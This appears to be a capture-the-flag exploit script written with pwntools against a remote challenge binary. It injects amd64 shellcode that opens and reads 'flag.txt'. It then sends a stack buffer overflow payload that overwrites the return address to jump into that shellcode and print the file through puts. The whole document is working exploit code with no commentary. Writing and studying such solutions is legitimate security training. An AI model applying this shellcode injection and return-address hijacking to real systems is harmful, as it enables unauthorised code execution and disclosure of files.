from pwn import *
import time

# p = process('chall')
# p = remote('localhost', 7777)
p = remote('chall.nitdgplug.org', 30104)
e = ELF('chall')

context.arch = "amd64"

shellcode = asm(
'''
mov eax, 2
mov rdi, 0x4040a0
xor esi, esi
syscall

xor eax, eax
mov edi, 3
mov rsi, 0x4040a0
mov rdx, 0x100
syscall

mov rdi, 0x4040a0
ret
''')

flag = b'flag.txt\x00'

p.recvline()
p.sendline(flag + shellcode)

payload = b'A' * 0x18
payload += p64(e.symbols['bomb'] + len(flag))
payload += p64(e.plt['puts'])

p.recvline()
p.sendline(payload)

p.interactive()
